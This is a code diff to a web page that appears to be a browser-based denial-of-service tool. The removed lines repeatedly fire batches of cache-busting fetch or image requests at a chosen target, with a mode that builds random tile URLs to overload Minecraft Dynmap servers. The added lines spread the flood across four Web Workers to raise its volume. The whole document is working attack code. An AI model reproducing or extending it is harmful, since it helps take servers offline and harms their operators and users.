@@ -29,24 +29,11 @@
         if (!target) {
             location.href = "https://example.com"
         } else {
-            setInterval(() => {
-                if (useImg) {
-                    if (method == "GET") {
-                        let img = new Image();
-                        img.src = target + "?" + makeid(8);
-                    }
-                } else {
-                    for (let i = 0; i < 100; i++) {
-                        let targetURL = target + "?" + makeid(8);
-                        if (dynmap) {
-                            targetURL = `${target}/tiles/world/flat/${Math.floor(Math.random() * 10)}_${Math.floor(Math.random() * 10)}/zzzzz_${Math.floor(Math.random() * 128)}_${Math.floor(Math.random() * 128)}.jpg?timestamp=${Math.floor(Math.random() * 100000000)}`
-                        }
-                        fetch(targetURL, {
-                            method
-                        }).catch(() => { });
-                    }
-                }
-            }, delay);
+            for (let i = 0; i < 4; i++) {
+                new Worker("./worker.js").postMessage(JSON.stringify({
+                    target, method, delay, useImg, dynmap
+                }))
+            }
         }
     </script>
 </body>
